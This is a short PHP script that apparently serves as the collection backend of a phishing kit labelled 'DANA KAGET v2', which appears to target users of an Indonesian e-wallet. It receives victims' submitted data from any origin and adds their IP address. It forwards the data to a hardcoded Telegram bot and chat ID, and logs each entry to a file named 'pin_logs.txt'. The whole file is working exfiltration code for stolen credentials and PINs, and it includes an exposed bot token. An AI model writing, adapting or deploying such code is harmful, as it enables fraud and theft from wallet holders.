<?php
$BOT_TOKEN = '8209194141:AAEnEpSqOtTALdvQik5mbbHTX-GoR8Iy7BQ';
$CHAT_ID = '7839405566';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') exit(200);

$input = file_get_contents('php://input');
$data = json_decode($input, true);
if (!$data) exit(json_encode(['error'=>'Invalid JSON']));

$data['ip'] = $_SERVER['REMOTE_ADDR'] ?? '';
$msg = "━━━━━━━━━━━━━━━━━━\n🔄 DANA KAGET v2\n━━━━━━━━━━━━━━━━━━\n\n";
$msg .= $data['message'] ?? json_encode($data);
$msg .= "\n\n🕒 " . date('Y-m-d H:i:s') . "\n🌐 IP: " . $data['ip'];

$url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
$post = ['chat_id' => $CHAT_ID, 'text' => $msg, 'parse_mode' => 'Markdown'];
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

file_put_contents('pin_logs.txt', '['.date('c').'] '.json_encode($data).PHP_EOL, FILE_APPEND);
echo json_encode(['success'=>true]);
